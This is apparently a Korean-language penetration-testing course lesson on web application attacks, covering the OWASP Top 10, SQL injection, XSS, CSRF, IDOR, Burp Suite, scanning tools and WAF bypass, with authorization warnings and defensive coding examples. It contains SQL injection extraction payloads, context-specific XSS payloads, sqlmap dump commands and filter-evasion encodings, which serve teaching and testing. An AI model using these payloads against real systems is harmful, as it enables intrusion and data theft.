# 웹 애플리케이션 해킹

**이전**: [04. 취약점 평가](./04_Vulnerability_Assessment.md) | **다음**: [06. 인증 공격](./06_Authentication_Attacks.md)

---

웹 애플리케이션(Web Application)은 현대 조직에서 가장 일반적인 공격 표면이다. 이 레슨은 OWASP Top 10 취약점을 심층적으로 다루며, SQL 인젝션(SQL Injection), 크로스사이트 스크립팅(Cross-Site Scripting, XSS), 크로스사이트 요청 위조(Cross-Site Request Forgery, CSRF) 및 기타 중요한 웹 애플리케이션 결함을 공격자 관점에서 분석한다.

> **중요**: 이 레슨에 설명된 모든 기법은 자신이 소유하거나 명시적인 서면 허가를 받은 시스템에서만 사용해야 한다. 무단 접근은 범죄 행위이다.

**난이도**: ⭐⭐⭐

## 학습 목표

이 레슨을 완료하면 다음을 수행할 수 있다:

1. 모든 OWASP Top 10 취약점 클래스를 식별하고 익스플로잇한다
2. SQL 인젝션을 탐지부터 데이터 추출까지 수행한다
3. 반사형(Reflected), 저장형(Stored) 및 DOM 기반(DOM-based) XSS 공격을 실행한다
4. CSRF 익스플로잇을 제작하고 토큰 기반 방어를 이해한다
5. IDOR(Insecure Direct Object Reference) 취약점을 발견하고 익스플로잇한다
6. Burp Suite를 사용하여 체계적인 웹 애플리케이션 테스트를 수행한다
7. 사용자 정의 스크립트로 웹 취약점 스캐닝을 자동화한다
8. 인코딩 및 난독화를 사용하여 웹 애플리케이션 방화벽(WAF)을 우회한다

---

## 목차

1. [OWASP Top 10 (2021) 심층 분석](#1-owasp-top-10-2021-심층-분석)
2. [SQL 인젝션 기법](#2-sql-인젝션-기법)
3. [크로스사이트 스크립팅(XSS)](#3-크로스사이트-스크립팅xss)
4. [크로스사이트 요청 위조(CSRF)](#4-크로스사이트-요청-위조csrf)
5. [안전하지 않은 직접 객체 참조(IDOR)](#5-안전하지-않은-직접-객체-참조idor)
6. [Burp Suite 방법론](#6-burp-suite-방법론)
7. [자동화된 웹 스캐닝](#7-자동화된-웹-스캐닝)
8. [WAF 우회 기법](#8-waf-우회-기법)
9. [API 보안 테스트](#9-api-보안-테스트)
10. [웹 익스플로잇 보고](#10-웹-익스플로잇-보고)
11. [연습문제](#11-연습문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. OWASP Top 10 (2021) 심층 분석

OWASP Top 10은 가장 중요한 웹 애플리케이션 보안 위험을 나타낸다:

| 순위 | 카테고리 | 설명 |
|------|----------|------|
| A01 | 취약한 접근 제어(Broken Access Control) | 무단 작업을 허용하는 권한 부여 실패 |
| A02 | 암호화 실패(Cryptographic Failures) | 민감한 데이터를 노출하는 약한 암호화 |
| A03 | 인젝션(Injection) | SQL, NoSQL, OS, LDAP 인젝션 |
| A04 | 불안전한 설계(Insecure Design) | 설계 단계에서 누락된 보안 제어 |
| A05 | 보안 설정 오류(Security Misconfiguration) | 기본 구성, 열린 클라우드 스토리지 |
| A06 | 취약한 컴포넌트(Vulnerable Components) | 알려진 취약점이 있는 컴포넌트 사용 |
| A07 | 인증 실패(Authentication Failures) | 손상된 인증 및 세션 관리 |
| A08 | 소프트웨어/데이터 무결성(Software/Data Integrity) | 불안전한 CI/CD, 서명되지 않은 업데이트 |
| A09 | 로깅 실패(Logging Failures) | 불충분한 로깅 및 모니터링 |
| A10 | SSRF | 서버측 요청 위조(Server-Side Request Forgery) |

---

## 2. SQL 인젝션 기법

### 2.1 SQL 인젝션 유형

**유니온 기반 SQLi(Union-based SQLi)**: UNION SELECT를 사용하여 다른 테이블에서 데이터를 추출한다.

**에러 기반 SQLi(Error-based SQLi)**: 데이터베이스 오류 메시지를 이용하여 데이터를 추출한다.

**블라인드 SQLi (불리언)(Blind SQLi, Boolean)**: 참/거짓 응답을 기반으로 데이터를 추론한다.

**블라인드 SQLi (시간 기반)(Blind SQLi, Time-based)**: 응답 시간 지연을 기반으로 데이터를 추론한다.

**대역 외 SQLi(Out-of-band SQLi)**: DNS 또는 HTTP 요청을 통해 데이터를 유출한다.

### 2.2 탐지 및 익스플로잇

```python
"""
SQL Injection testing framework for authorized web app assessments.

Demonstrates SQLi detection and exploitation techniques
used in penetration testing. ONLY use against authorized targets.
"""

import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import quote


@dataclass
class SQLiPayload:
    """A SQL injection test payload."""
    name: str
    payload: str
    technique: str
    description: str
    detection_pattern: str = ""


@dataclass
class SQLiResult:
    """Result of a SQL injection test."""
    url: str
    parameter: str
    payload: SQLiPayload
    vulnerable: bool
    evidence: str = ""
    database_type: str = ""


# Common SQLi detection payloads
DETECTION_PAYLOADS = [
    SQLiPayload(
        name="single_quote",
        payload="'",
        technique="error-based",
        description="Basic quote to trigger SQL syntax error",
        detection_pattern=r"(SQL syntax|mysql_fetch|ORA-\d+|PG::Error)",
    ),
    SQLiPayload(
        name="boolean_true",
        payload="' OR '1'='1",
        technique="boolean-blind",
        description="Always-true condition for authentication bypass",
    ),
    SQLiPayload(
        name="boolean_false",
        payload="' OR '1'='2",
        technique="boolean-blind",
        description="Always-false condition for comparison",
    ),
    SQLiPayload(
        name="time_delay",
        payload="'; WAITFOR DELAY '0:0:5'--",
        technique="time-blind",
        description="MSSQL time-based blind injection",
    ),
    SQLiPayload(
        name="time_delay_mysql",
        payload="' OR SLEEP(5)--",
        technique="time-blind",
        description="MySQL time-based blind injection",
    ),
    SQLiPayload(
        name="union_columns",
        payload="' UNION SELECT NULL--",
        technique="union",
        description="Union injection — determine column count",
    ),
    SQLiPayload(
        name="stacked_query",
        payload="'; SELECT 1--",
        technique="stacked",
        description="Stacked query injection test",
    ),
]


# Union-based extraction payloads
EXTRACTION_PAYLOADS = {
    "mysql": {
        "version": "' UNION SELECT version()--",
        "databases": "' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--",
        "tables": "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'--",
        "columns": "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'--",
        "data": "' UNION SELECT GROUP_CONCAT({columns}) FROM {table}--",
    },
    "postgresql": {
        "version": "' UNION SELECT version()--",
        "databases": "' UNION SELECT string_agg(datname,',') FROM pg_database--",
        "tables": "' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--",
    },
}


def generate_sqli_report(results: list[SQLiResult]) -> str:
    """Generate a SQLi assessment report."""
    vulnerable = [r for r in results if r.vulnerable]
    lines = [
        "SQL Injection Assessment Report",
        "=" * 60,
        f"Total tests: {len(results)}",
        f"Vulnerable parameters: {len(vulnerable)}",
        "",
    ]
    for r in vulnerable:
        lines.append(f"\n[VULNERABLE] {r.url}")
        lines.append(f"  Parameter: {r.parameter}")
        lines.append(f"  Technique: {r.payload.technique}")
        lines.append(f"  Payload: {r.payload.payload}")
        if r.database_type:
            lines.append(f"  Database: {r.database_type}")
        if r.evidence:
            lines.append(f"  Evidence: {r.evidence[:200]}")
    return "\n".join(lines)


# Defensive: parameterized query examples
SAFE_QUERY_EXAMPLES = {
    "python_sqlite": '''
# VULNERABLE:
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")

# SAFE — parameterized query:
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
''',
    "python_psycopg2": '''
# VULNERABLE:
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")

# SAFE — parameterized query:
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
''',
    "sqlalchemy": '''
# VULNERABLE:
db.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))

# SAFE — bound parameter:
db.execute(text("SELECT * FROM users WHERE name = :name"), {"name": user_input})
''',
}


if __name__ == "__main__":
    print("SQL Injection Testing Framework")
    print("=" * 50)
    print(f"Detection payloads: {len(DETECTION_PAYLOADS)}")
    for p in DETECTION_PAYLOADS:
        print(f"  [{p.technique:15s}] {p.name}: {p.payload}")
    print("\nSafe query patterns:")
    for lib, code in SAFE_QUERY_EXAMPLES.items():
        print(f"\n  --- {lib} ---{code}")
```

---

## 3. 크로스사이트 스크립팅(XSS)

### 3.1 XSS 유형

**반사형 XSS(Reflected XSS)**: 페이로드가 요청에서 응답으로 반사된다.

**저장형 XSS(Stored XSS)**: 페이로드가 서버에 저장되어 모든 사용자에게 제공된다.

**DOM 기반 XSS(DOM-based XSS)**: 페이로드가 클라이언트 브라우저에서 DOM을 조작한다.

### 3.2 XSS 페이로드와 컨텍스트

```python
"""
XSS payload generator for different injection contexts.

Generates context-appropriate XSS payloads for authorized
web application testing.
"""

from dataclasses import dataclass
from enum import Enum


class XSSContext(Enum):
    """HTML context where input is reflected."""
    HTML_BODY = "Inside HTML body tags"
    HTML_ATTRIBUTE = "Inside an HTML attribute"
    JAVASCRIPT = "Inside a JavaScript block"
    URL = "Inside a URL parameter"
    CSS = "Inside CSS styles"
    HTML_COMMENT = "Inside an HTML comment"


@dataclass
class XSSPayload:
    """An XSS test payload for a specific context."""
    context: XSSContext
    payload: str
    description: str
    bypass_target: str = ""  # What WAF/filter it bypasses


XSS_PAYLOADS = {
    XSSContext.HTML_BODY: [
        XSSPayload(XSSContext.HTML_BODY,
                  '<script>alert(document.domain)</script>',
                  "Basic script injection"),
        XSSPayload(XSSContext.HTML_BODY,
                  '<img src=x onerror=alert(document.domain)>',
                  "Event handler injection"),
        XSSPayload(XSSContext.HTML_BODY,
                  '<svg onload=alert(document.domain)>',
                  "SVG event handler"),
        XSSPayload(XSSContext.HTML_BODY,
                  '<details open ontoggle=alert(document.domain)>',
                  "Details element event"),
    ],
    XSSContext.HTML_ATTRIBUTE: [
        XSSPayload(XSSContext.HTML_ATTRIBUTE,
                  '" onmouseover="alert(document.domain)',
                  "Break out of attribute with event"),
        XSSPayload(XSSContext.HTML_ATTRIBUTE,
                  "' onfocus='alert(document.domain)' autofocus='",
                  "Autofocus event trigger"),
        XSSPayload(XSSContext.HTML_ATTRIBUTE,
                  '"><script>alert(document.domain)</script>',
                  "Break out of tag entirely"),
    ],
    XSSContext.JAVASCRIPT: [
        XSSPayload(XSSContext.JAVASCRIPT,
                  "';alert(document.domain);//",
                  "Break out of JS string (single quote)"),
        XSSPayload(XSSContext.JAVASCRIPT,
                  '";alert(document.domain);//',
                  "Break out of JS string (double quote)"),
        XSSPayload(XSSContext.JAVASCRIPT,
                  '</script><script>alert(document.domain)</script>',
                  "Close script tag and inject new one"),
    ],
}


def generate_payload_list(context: XSSContext) -> list[str]:
    """Get all payloads for a specific context."""
    return [p.payload for p in XSS_PAYLOADS.get(context, [])]


# Defense: encoding functions
def html_encode(text: str) -> str:
    """Encode special characters to prevent HTML injection."""
    replacements = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
    }
    for char, entity in replacements.items():
        text = text.replace(char, entity)
    return text


if __name__ == "__main__":
    print("XSS Payload Generator")
    print("=" * 50)
    for ctx, payloads in XSS_PAYLOADS.items():
        print(f"\n--- {ctx.value} ---")
        for p in payloads:
            print(f"  {p.description}")
            print(f"  Payload: {p.payload}")
```

---

## 4. 크로스사이트 요청 위조(CSRF)

CSRF(Cross-Site Request Forgery)는 브라우저의 자동 쿠키 포함을 악용하여 인증된 사용자가 원치 않는 작업을 실행하도록 강제한다.

### 4.1 CSRF 공격 흐름

```
1. Victim logs into bank.com (session cookie set)
2. Victim visits attacker's page (evil.com)
3. evil.com contains hidden form that POSTs to bank.com/transfer
4. Browser automatically includes bank.com cookies
5. Transfer executes with victim's session
```

### 4.2 CSRF 방어

- **CSRF 토큰**: 폼에 세션/요청별 고유 토큰 포함
- **SameSite 쿠키**: `SameSite=Strict` 또는 `SameSite=Lax`
- **Origin/Referer 확인**: 요청 출처 헤더 검증
- **사용자 정의 헤더**: 사용자 정의 헤더 요구 (X-CSRF-Token)

---

## 5. 안전하지 않은 직접 객체 참조(IDOR)

IDOR(Insecure Direct Object Reference)은 애플리케이션이 내부 객체 참조(데이터베이스 ID, 파일 경로)를 노출하고 권한 부여를 검증하지 못할 때 발생한다.

```python
"""
IDOR testing module for authorized web application assessments.

Tests for insecure direct object reference vulnerabilities
by manipulating resource identifiers.
"""

from dataclasses import dataclass, field
from typing import Optional


@dataclass
class IDORTest:
    """An IDOR test case."""
    endpoint: str
    parameter: str
    original_value: str
    test_values: list[str]
    method: str = "GET"
    description: str = ""


@dataclass
class IDORFinding:
    """A confirmed IDOR vulnerability."""
    endpoint: str
    parameter: str
    original_value: str
    accessed_value: str
    data_exposed: str
    severity: str = "High"


def generate_idor_tests(endpoint: str, param: str, current_id: str) -> list[IDORTest]:
    """Generate IDOR test cases for a numeric ID parameter."""
    tests = []
    if current_id.isdigit():
        cid = int(current_id)
        test_vals = [
            str(cid - 1), str(cid + 1), str(cid + 100),
            "0", "1", "-1", str(cid * 2),
        ]
        tests.append(IDORTest(
            endpoint=endpoint, parameter=param,
            original_value=current_id,
            test_values=test_vals,
            description="Numeric ID enumeration",
        ))
    return tests


if __name__ == "__main__":
    print("IDOR Testing Module")
    print("=" * 40)
    tests = generate_idor_tests("/api/users/{id}/profile", "id", "42")
    for t in tests:
        print(f"Endpoint: {t.endpoint}")
        print(f"Test values: {t.test_values}")
```

---

## 6. Burp Suite 방법론

### 6.1 체계적 테스트 워크플로우

```
1. Configure browser proxy → Burp (127.0.0.1:8080)
2. Spider/crawl the application (Target > Site Map)
3. Review site map for interesting endpoints
4. Send requests to Repeater for manual testing
5. Use Intruder for automated fuzzing
6. Run Scanner for automated vulnerability detection
7. Check results and validate findings
```

### 6.2 주요 Burp 확장 프로그램

| 확장 프로그램 | 목적 |
|-------------|------|
| Autorize | 권한 부여 테스트 |
| JWT Editor | JWT 조작 |
| Param Miner | 숨겨진 매개변수 발견 |
| Turbo Intruder | 고속 퍼징 |
| Logger++ | 향상된 로깅 |
| Collaborator Everywhere | 대역 외 탐지 |

---

## 7. 자동화된 웹 스캐닝

```bash
# Nikto — web server scanner
nikto -h http://target:8080

# SQLMap — automated SQL injection
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# ffuf — web fuzzing
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/api/FUZZ -w api-wordlist.txt -mc 200,301

# wfuzz — web fuzzer
wfuzz -c -z file,wordlist.txt http://target/FUZZ
```

---

## 8. WAF 우회 기법

### 8.1 인코딩 우회

| 기법 | 예시 | 우회 대상 |
|------|------|----------|
| URL 인코딩 | `%3Cscript%3E` | 기본 키워드 필터 |
| 이중 인코딩 | `%253Cscript%253E` | 단일 디코드 필터 |
| 유니코드 인코딩 | `\u003cscript\u003e` | ASCII 전용 필터 |
| HTML 엔티티 | `&#60;script&#62;` | 태그 필터 |
| 대소문자 변형 | `<ScRiPt>` | 대소문자 구분 필터 |
| 널 바이트 | `%00<script>` | 길이 검사 필터 |

---

## 9. API 보안 테스트

### 9.1 REST API 테스트 체크리스트

- 인증 우회(엔드포인트에 인증 누락)
- 권한 부여(IDOR, 권한 상승)
- 입력 유효성 검사(JSON 매개변수의 인젝션)
- 속도 제한(무차별 대입 및 남용)
- 대량 할당(Mass assignment, 예기치 않은 매개변수 수락)
- 상세한 오류 메시지(스택 트레이스, 내부 경로)

---

## 10. 웹 익스플로잇 보고

각 웹 취약점 결과에는 다음이 포함되어야 한다:

- **제목**: "댓글 필드의 저장형 XSS"
- **심각도**: CVSS 점수 및 등급
- **URL**: 영향받는 정확한 엔드포인트
- **매개변수**: 취약한 입력 필드
- **페이로드**: 작동하는 개념 증명(PoC)
- **재현 단계**: 누구나 따라할 수 있는 번호가 매겨진 단계
- **영향**: 공격자가 달성할 수 있는 것
- **교정**: 구체적인 코드 수준 수정

---

## 11. 연습문제

1. **SQLi 실습**: DVWA를 설정하고 모든 보안 수준(낮음, 중간, 높음)에서 SQL 인젝션을 익스플로잇한다. 각 수준의 필터 차이를 문서화한다.

2. **XSS 챌린지**: OWASP WebGoat에서 반사형, 저장형, DOM 기반 XSS를 찾아 익스플로잇한다. 각 컨텍스트에 맞는 페이로드를 작성한다.

3. **CSRF PoC**: CSRF 보호가 없는 폼을 익스플로잇하는 CSRF 개념 증명 HTML 페이지를 만든다. 그런 다음 CSRF 토큰 방어를 구현하고 테스트한다.

4. **IDOR 탐색**: 의도적으로 취약한 API에서 IDOR 취약점을 테스트한다. 각 결과를 증거와 함께 문서화한다.

5. **WAF 우회**: `<script>`와 `alert`를 차단하는 WAF가 주어졌을 때, 필터를 우회하는 5가지 대안 XSS 페이로드를 작성한다.

6. **전체 평가**: 연습 대상에 대한 완전한 웹 애플리케이션 평가를 수행한다. 전문적인 보고서를 작성한다.

---

## 12. 요약

웹 애플리케이션 해킹은 현대 조직에서 가장 노출된 공격 표면을 대상으로 한다:

- **OWASP Top 10**은 체계적인 웹 테스트를 위한 프레임워크를 제공한다
- **SQL 인젝션**은 여전히 중요하다 — 탐지부터 전체 데이터 추출까지
- **XSS**는 사용자와 애플리케이션 간의 신뢰를 공격한다
- **CSRF**는 무단 작업을 위해 자동 쿠키 포함을 악용한다
- **IDOR**은 예측 가능한 리소스 식별자를 통해 권한 부여를 우회한다
- **Burp Suite**는 전문적 웹 테스트를 위한 필수 도구이다
- **WAF 우회**는 심층 방어가 왜 필요한지 보여준다

---

## 13. 참고 자료

- OWASP Top 10 (2021): https://owasp.org/Top10/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- SQLMap: https://sqlmap.org/
- HackTricks Web: https://book.hacktricks.xyz/pentesting-web/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
